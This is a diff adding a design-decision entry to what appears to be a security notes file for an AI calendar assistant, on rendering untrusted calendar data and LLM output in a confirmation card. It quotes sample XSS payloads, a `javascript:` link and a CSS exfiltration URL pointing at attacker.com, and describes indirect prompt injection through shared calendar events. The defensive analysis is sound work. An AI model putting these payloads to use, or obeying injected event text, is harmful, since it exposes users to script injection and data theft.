@@ -391,3 +391,129 @@ Key details:
 - Adding tools with higher blast radius (email, file access)
 - Moving toward multi-tenant or enterprise deployment
 - Security audit or compliance review requiring ML-based injection defense
+
+---
+
+## 6. Untrusted Content in Confirmation Cards — React Escaping Only
+
+**Date:** 2026-03-17
+**Issue:** #101 (Confirmation Card)
+**Files:** `frontend/src/components/chat/ConfirmationCard.tsx`, `frontend/src/lib/format-confirmation.ts`, `backend/app/agents/router.py`
+
+### The problem
+
+The confirmation card renders data that originates from two untrusted sources:
+
+1. **User's calendar (indirect injection):** The agent calls `search_events` to read existing events, then may propose an update or deletion. The event `summary`, `description`, `location`, and `attendees` come from Google Calendar — which includes events shared by other people. A malicious actor could share a calendar event containing `<script>alert('xss')</script>` in the title or `[Click here](javascript:void)` in the description. When the agent proposes modifying that event, the malicious content flows into the confirmation card.
+
+2. **LLM output (prompt injection):** If the LLM is manipulated (via indirect prompt injection from event descriptions or direct user input), it could propose creating an event whose fields contain malicious payloads. The tool's `interrupt()` call passes whatever the LLM generated — `summary`, `description`, `location` — directly into the SSE confirmation event.
+
+In both cases, the data path is: **Google Calendar API → agent tool → `interrupt(event_details)` → SSE `confirmation` event → `useChat` state → `ConfirmationCard` render**. No layer in this chain performs explicit sanitization.
+
+### What we built (MVP)
+
+No sanitization at any layer. The confirmation card relies entirely on React's default JSX text escaping:
+
+```tsx
+// ConfirmationCard.tsx — values rendered as text nodes
+<dd>{field.value}</dd>
+
+// format-confirmation.ts — values passed through as strings
+fields.push({ label: "Event", value: details["summary"] });
+fields.push({ label: "Description", value: details["description"] });
+```
+
+React's JSX interpolation (`{expression}`) creates text nodes, not HTML. A malicious `<script>alert('xss')</script>` renders as the literal string `<script>alert('xss')</script>` in the DOM — the browser never parses it as markup.
+
+### Why this is sufficient for now
+
+- **React auto-escaping is robust.** JSX text interpolation has been React's primary XSS defense since React 0.x. It escapes `<`, `>`, `&`, `"`, and `'` in text content. This is not a hack or workaround — it's a deliberate security feature of the framework.
+- **No dangerous rendering patterns exist.** The component uses no `dangerouslySetInnerHTML`, no dynamic `href`/`src` attributes, no `eval()`, no CSS injection vectors. Values are only ever rendered as `<dd>` text content.
+- **The attack surface is bounded.** Even if rendering were somehow bypassed, the confirmation card is a local UI element — it can't exfiltrate data to a third party unless the attacker also controls a network endpoint, which requires a separate vulnerability.
+- **Write operations require explicit user approval.** The confirmation card is the human-in-the-loop gate. A user seeing `<script>alert('xss')</script>` in an event title would reject it. The malicious content is visible, not hidden.
+
+### When this breaks
+
+1. **Markdown or rich text rendering.** If anyone adds a Markdown renderer (e.g., `react-markdown`) or `dangerouslySetInnerHTML` to format event descriptions with line breaks, links, or bold text, the XSS protection disappears immediately. This is the most likely regression path — a developer adds "just a simple Markdown renderer" for better formatting without realizing the content is untrusted.
+
+2. **Link rendering from event data.** If attendee emails become `mailto:` links, or locations become Google Maps links constructed from event data, an attacker could inject `javascript:` URIs or crafted URLs that redirect to phishing pages.
+
+3. **CSS injection.** If event data is ever used in `style` attributes or CSS custom properties (e.g., color-coding events by category), an attacker could inject CSS that overlays fake UI elements or exfiltrates data via `background-image: url(attacker.com/steal?data=...)`.
+
+4. **Server-side rendering context.** If the confirmation card is ever rendered server-side (SSR) outside React's JSX context — for example, in an email notification or a Slack webhook — the auto-escaping doesn't apply and the raw HTML would be interpreted.
+
+### The upgrade path — Explicit sanitization at the boundary
+
+Add sanitization where untrusted data enters the frontend, so safety doesn't depend on every future developer remembering that React escaping is the only defense:
+
+**Option A: Sanitize in the SSE event handler (recommended)**
+
+Strip HTML from confirmation details as they arrive, before they enter React state:
+
+```typescript
+// lib/sanitize.ts
+function stripHtml(input: string): string {
+  // Replace HTML tags, then decode entities for display
+  return input.replace(/<[^>]*>/g, "").replace(/&[a-z]+;/gi, " ");
+}
+
+// hooks/useChat.ts — in handleEvent()
+case "confirmation": {
+  const sanitized = Object.fromEntries(
+    Object.entries(event.details).map(([k, v]) => [
+      k,
+      typeof v === "string" ? stripHtml(v) : v,
+    ]),
+  );
+  dispatch({
+    type: "CONFIRMATION_RECEIVED",
+    confirmation: { ...event, details: sanitized, status: "pending" },
+  });
+}
+```
+
+This protects all downstream rendering regardless of future component changes.
+
+**Option B: Sanitize on the backend before SSE emission**
+
+Strip HTML in `_stream_response()` when building the confirmation event, so the frontend never sees raw HTML:
+
+```python
+import re
+
+def _strip_html(text: str) -> str:
+    return re.sub(r"<[^>]*>", "", text)
+
+# In _stream_response(), when building the confirmation event:
+sanitized = {
+    k: _strip_html(v) if isinstance(v, str) else v
+    for k, v in interrupt_value.items()
+}
+confirmation_event = {
+    "type": "confirmation",
+    "action": sanitized["action"],
+    "action_id": action_id,
+    "details": sanitized,
+}
+```
+
+**Option C: Use DOMPurify (if rich text is needed later)**
+
+If event descriptions need to support formatting:
+
+```typescript
+import DOMPurify from "dompurify";
+
+// Allow safe inline formatting only
+const clean = DOMPurify.sanitize(description, {
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "br"],
+  ALLOWED_ATTR: [],
+});
+```
+
+### Trigger to upgrade
+
+- Any PR that adds Markdown rendering, `dangerouslySetInnerHTML`, or link rendering to chat components
+- Adding email/Slack notifications that render event data outside React
+- Security audit or pen test that flags the lack of explicit sanitization
+- Evidence of calendar events with HTML/script payloads in production logs
